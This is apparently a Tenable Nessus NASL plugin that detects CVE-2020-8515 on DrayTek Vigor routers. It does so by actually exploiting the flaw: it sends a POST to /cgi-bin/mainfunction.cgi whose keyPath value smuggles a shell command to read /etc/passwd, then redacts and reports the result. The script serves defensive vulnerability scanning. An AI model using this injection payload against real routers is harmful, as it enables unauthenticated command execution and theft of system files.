#
# 
#

include('compat.inc');

if (description)
{
  script_id(141781);
  script_version("1.2");
  script_set_attribute(attribute:"plugin_modification_date", value:"2020/10/23");

  script_cve_id("CVE-2020-8515");

  script_name(english:"DrayTek Vigor < 1.5.1 Unauthenticated RCE (Direct Check)");
  script_summary(english:"Tries to exploit vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by an unauthenticated remote command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"Nessus was able to exploit an un-authenticated remote command execution vulnerability
on the web adminstration UI on the remote router and was able to retrieve the contents
of /etc/passwd.");
  # https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?56fb076c");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 1.5.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2020-8515");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2020/02/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2020/02/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2020/10/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:draytek:vigor");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2020 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("draytek_vigor_detect.nbin");
  script_require_keys("Host/DrayTek/Vigor");

  exit(0);
}

include('http.inc');

if (!get_kb_item('Host/DrayTek/Vigor')) audit(AUDIT_HOST_NOT, 'DrayTek Vigor');
model = get_kb_item_or_exit('Host/DrayTek/Vigor/model');

if(model !~ "^[Vv]igor(300[Bb]|2960|3900)")
  audit(AUDIT_HOST_NOT, 'affected');

port = get_http_port(default:443);

params = 'action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a';

res = http_send_recv3(
  item            : '/cgi-bin/mainfunction.cgi',
  method          : 'POST',
  port            : port,
  follow_redirect : 1,
  content_type    : 'application/x-www-form-urlencoded',
  exit_on_fail    : TRUE,
  data            : params
);

if(egrep(string:res[2], pattern:"root:.*:0:[01]:"))
{
  contents = res[2] - strstr(r[2], "<br />");

  if (isnull(contents)) security_report_v4(port:port, severity:SECURITY_HOLE);
  else
  {
    contents = data_protection::redact_etc_passwd(output:contents);
    report = '\n';
    report += 'Here are the duplicated contents of the file "/etc/passwd" that\n';
    report +=  'Nessus was able to read from the remote host :\n\n';
    report +=  contents;
    
    security_report_v4(port:port, extra:report, severity:SECURITY_HOLE);
  }
  exit(0);
}
else
{
  audit(AUDIT_HOST_NOT, 'affected');
}

